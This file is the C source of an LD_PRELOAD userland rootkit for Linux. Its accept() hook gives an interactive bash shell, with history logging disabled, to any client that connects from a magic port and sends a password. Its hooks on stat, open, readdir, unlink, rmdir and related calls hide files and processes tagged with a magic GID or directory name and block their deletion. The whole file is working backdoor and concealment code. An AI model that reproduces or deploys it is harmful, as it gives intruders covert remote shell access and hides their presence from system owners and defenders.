#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <limits.h>
#include <errno.h>

#include "md5.h"

#include "config.h"

#define BUFSIZZ 1024
#define F_DUPFD		0	/* Duplicate file descriptor.  */
#define F_GETFD		1	/* Get file descriptor flags.  */
#define F_SETFD		2	/* Set file descriptor flags.  */
#define F_GETFL		3	/* Get file status flags.  */
#define F_SETFL		4	/* Set file status flags.  */
#define O_NONBLOCK	  04000
#define O_NDELAY	O_NONBLOCK


static void init (void) __attribute__ ((constructor));

static int (*old_fxstat)(int ver, int fildes, struct stat *buf);
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);

static int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

static DIR *(*old_fdopendir)(int fd);
static DIR *(*old_opendir)(const char *name);

void getMD5(const char *ori,int len,char *buf);
void enterpass(int s);


static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);
char *argv[] = { "bash", "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=[root@remote-server]#", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/sbin/dnsdyn","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };


void init(void)
{
	#ifdef DEBUG
	printf("[-] ld_poison loaded.\n");
	#endif

	old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
	old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
	old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
	old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
	old_open = dlsym(RTLD_NEXT,"open");
	old_rmdir = dlsym(RTLD_NEXT,"rmdir");
	old_unlink = dlsym(RTLD_NEXT,"unlink");	
	old_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
	old_xstat = dlsym(RTLD_NEXT, "__xstat");
	old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
	
	old_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
	old_opendir = dlsym(RTLD_NEXT, "opendir");
	
	old_readdir = dlsym(RTLD_NEXT, "readdir");
	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	
	old_accept = dlsym(RTLD_NEXT, "accept");
	
}
void enterpass(int s){
	  //char *prompt="Password [displayed to screen]: ";
	  char *motd="<< Welcome >>\n";
	  char buffer[64]={0x00};

	  //write(s,banner,strlen(banner));
	  //write(s,prompt,strlen(prompt));
	  read(s,buffer,sizeof(buffer));
			/*
			//Hash password
			char trans[SALT_LENGTH+33] = {'\0'};
		  	char tmp[3]={'\0'},buf[33]={'\0'},hash[33]={'\0'};
			int i;
			for(i=0;i<strlen(buffer);i++){
				if(buffer[i]==0x00){
					break;
				}
			}
			if(i>2)
				i--;
		  	getMD5(buffer,i,buf);
			strncpy(trans,_SALT_,SALT_LENGTH);
			for(i=0;i<32;i++){
					trans[SALT_LENGTH+i]=buf[i];
			}
			getMD5(trans,SALT_LENGTH+32,hash);
			sprintf(tmp, "%d",strlen(buf));
			//End Hash Password
			printf("%s",hash);
			*/
			printf("%s\n",buffer);
	  //if(!strncmp(hash, _RPASSWORD_, strlen(_RPASSWORD_))) {
	  if(!strncmp(buffer, _RPASSWORD_, strlen(_RPASSWORD_))) {
	    write(s,motd,strlen(motd));
	  }else {
	    //write(s,"Wrong!\n", 7);
	    close(s); 
	    _exit(0);
	  }
}
/*
* transfer char to its md5 char be know that buf must init with buf[33]={'\0'};
*/
void getMD5(const char *ori,int len,char *buf){
	unsigned char md[16];
	char tmp[3]={'\0'};
	int i;
	unsigned char tt[len];
	for(i=0;i<len;i++){
		tt[i] = ori[i];
	}
	MD5_CTX context;
	MD5Init (&context);
	MD5Update (&context, (unsigned char*)tt, len);
	MD5Final (md, &context);
	for (i = 0; i < 16; i++){
		sprintf(tmp,"%2.2x",md[i]);
		strcat(buf,tmp);
	}
	return;
}


int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	#ifdef DEBUG
		printf("accept hooked.\n");
	#endif
	int cli;
	cli = old_accept(sockfd,addr, addrlen);
	if( (addr->sa_family == AF_INET) ){
		struct sockaddr_in *cli_addr = (struct sockaddr_in *)addr;
	#ifdef DEBUG
		unsigned int th_sport = ntohl(cli_addr->sin_port);
		th_sport = th_sport>>16;
		printf("th_sport:%d\n",th_sport);
	#endif
		if( (cli_addr->sin_port == htons(_MAGIC_PORT_)) ){
			pid_t child;
			if(cli<0)
				return cli;
	#ifdef DEBUG
			printf("magic-client-in\n");
	#endif
			if((child=fork())==0){
				//old none-crypted style
			   	close(sockfd);
			  	dup2(cli,0);
			   	dup2(cli,1);
			   	dup2(cli,2);
				//close(0);
				//fid = fcntl(cli, F_DUPFD, 0);
			   	//enterpass(cli);
				char *motd="<< Welcome >>\n";
				char buffer[64]={0x00};

			    read(cli,buffer,sizeof(buffer));
							/*
							//Hash password
							char trans[SALT_LENGTH+33] = {'\0'};
						  	char tmp[3]={'\0'},buf[33]={'\0'},hash[33]={'\0'};
							int i;
							for(i=0;i<strlen(buffer);i++){
								if(buffer[i]==0x00){
									break;
								}
							}
							if(i>2)
								i--;
						  	getMD5(buffer,i,buf);
							strncpy(trans,_SALT_,SALT_LENGTH);
							for(i=0;i<32;i++){
									trans[SALT_LENGTH+i]=buf[i];
							}
							getMD5(trans,SALT_LENGTH+32,hash);
							printf("%s",hash);
							//End Hash Password
							*/
				//if(!strncmp(hash, _RPASSWORD_, strlen(_RPASSWORD_))) {
				if(!strncmp(buffer, _ACK_PWD_, strlen(_ACK_PWD_))) {
					write(cli,motd,strlen(motd));
					execve("/bin/bash", argv, envp);
					//printf("disConnected.");
					close(cli);
					_exit(0);
				}else {
					//write(s,"Wrong!\n", 7);
					close(cli); 
					_exit(0);
				} 	
			}
			wait(child);
			return -1;
		}
	}
	return cli;
}


int fstat(int fd, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID ) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("fstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(_STAT_VER, fd, &s_fstat);
	if(s_fstat.st_gid == MAGIC_GID){
		errno = ENOENT;
		return -1;
	}
	
	return old_fxstat64(_STAT_VER, fd, buf);
}

int __fxstat(int ver, int fildes, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__fxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(ver,fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return old_fxstat(ver,fildes, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__fxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat64(ver, fildes, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	return old_fxstat64(ver, fildes, buf);
}

int lstat(const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("lstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(_STAT_VER, file, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(file,MAGIC_DIR)) {
	//if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("lstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(_STAT_VER, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,MAGIC_DIR)) {
	//if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("__lxstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat(ver, file, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(file,MAGIC_DIR)) {
	//if (s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("__lxstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_lxstat64(ver, file, &s_fstat);
	
	#ifdef DEBUG
	printf("File: %s\n",file);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(file,MAGIC_DIR)) {
	//if(s_fstat.st_gid == MAGIC_GID || strstr(file,CONFIG_FILE) || strstr(file,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_lxstat64(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("open hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL)) { 
	//if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) { 
		errno = ENOENT;
		return -1;
	}

	return old_open(pathname,flags,mode);
}

int rmdir(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("rmdir hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL)) {
	//if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_rmdir(pathname);
}

int stat(const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("stat hooked\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, path, &s_fstat);
	
	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif
	
	if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) { 
	//if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) { 
		errno = ENOENT;
		return -1;
	}

	return old_xstat(3, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;

	#ifdef DEBUG
	printf("stat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(_STAT_VER, path, &s_fstat);

	if (s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
	//if (s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("xstat hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 
	
	memset(&s_fstat, 0, sizeof(stat));

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) {
	//if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) {
		errno = ENOENT;
		return -1;
	}

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
	struct stat64 s_fstat;
	
	#ifdef DEBUG
	printf("xstat64 hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat64(ver,path, &s_fstat);

	#ifdef DEBUG
	printf("Path: %s\n",path);
	printf("GID: %d\n",s_fstat.st_gid);
	#endif 

	if(s_fstat.st_gid == MAGIC_GID || strstr(path,MAGIC_DIR)) { 
	//if(s_fstat.st_gid == MAGIC_GID || strstr(path,CONFIG_FILE) || strstr(path,MAGIC_DIR)) { 
		errno = ENOENT;
		return -1;
	}
	
	return old_xstat64(ver,path, buf);
}

int unlink(const char *pathname)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlink hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_xstat(_STAT_VER, pathname, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL)) { 
	//if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) {
		errno = ENOENT;
		return -1;
	}
	
	return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
	struct stat s_fstat;
	
	#ifdef DEBUG
	printf("unlinkat hooked.\n");
	#endif
	
	memset(&s_fstat, 0, sizeof(stat));
	
	old_fxstat(_STAT_VER, dirfd, &s_fstat);
	
	if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL)) { 
	//if(s_fstat.st_gid == MAGIC_GID || (strstr(pathname, MAGIC_DIR) != NULL) || (strstr(pathname, CONFIG_FILE) != NULL)) { 
		errno = ENOENT;
		return -1;
	}
	
	return old_unlinkat(dirfd, pathname, flags);
}

DIR *fdopendir(int fd)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("fdopendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_fxstat(_STAT_VER, fd, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return NULL;
	}

	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{
	struct stat s_fstat;

	#ifdef DEBUG
	printf("opendir hooked.\n");
	#endif

	memset(&s_fstat, 0, sizeof(stat));

	old_xstat(_STAT_VER, name, &s_fstat);

	if(s_fstat.st_gid == MAGIC_GID || strstr(name,MAGIC_DIR)) {
	//if(s_fstat.st_gid == MAGIC_GID || strstr(name,CONFIG_FILE) || strstr(name,MAGIC_DIR)) {
		//printf("name");
		errno = ENOENT;
		return NULL;
	}

	return old_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir hooked.\n");
	#endif

	do {
		dir = old_readdir(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;

		if(dir != NULL) {
	                char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	                old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || s_fstat.st_gid == MAGIC_GID));
	 //while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	//} while(dir && (strstr(dir->d_name, MAGIC_DIR) == NULL) && (strstr(dir->d_name, CONFIG_FILE) == NULL) && (s_fstat.st_gid != MAGIC_GID) );

	return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *dir;
	struct stat s_fstat;
	
	memset(&s_fstat, 0, sizeof(stat));

	#ifdef DEBUG
	printf("readdir64 hooked.\n");
	#endif

	do {
		dir = old_readdir64(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))  
			continue;

		if(dir != NULL) {
	       char path[PATH_MAX + 1];
			snprintf(path,PATH_MAX,"/proc/%s",dir->d_name);
	       old_xstat(_STAT_VER, path, &s_fstat);
		}
	} while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || s_fstat.st_gid == MAGIC_GID));
	//while(dir && (strstr(dir->d_name, MAGIC_DIR) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
	//} while(dir && (strstr(dir->d_name, MAGIC_DIR) == NULL) && (strstr(dir->d_name, CONFIG_FILE) == NULL) && (s_fstat.st_gid != MAGIC_GID) );
	
	return dir;
}	
